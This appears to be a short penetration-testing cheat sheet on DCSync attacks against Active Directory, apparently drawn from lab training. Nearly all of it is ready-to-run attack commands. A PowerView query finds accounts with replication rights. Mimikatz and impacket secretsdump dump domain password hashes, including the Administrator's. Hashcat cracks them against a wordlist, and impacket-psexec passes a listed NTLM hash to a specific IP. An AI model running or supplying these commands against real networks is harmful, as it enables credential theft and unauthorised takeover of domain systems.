To launch a DSsync attac, a user needs to have the following
privileges:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set rights.

By default, members of the Domain Admins, Enterprise Admins, and
Administrators groups have these rights assigned.

Using mimikatz, provide the user for which we want to obtain creds

# Find Users with required permissions
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

-----------------------

# Dump hash with Mimikatz
```bash
privilege::debug

lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

# Dump hash with impacket
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```

-----------------------

# Cracking with hashcat
```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

-----------------------

# Use the NTLM hash directly
```bash
impacket-psexec corp\dave@192.168.196.248 -hashes :56e4633688c0fdd57c610faf9d7ab8df
```

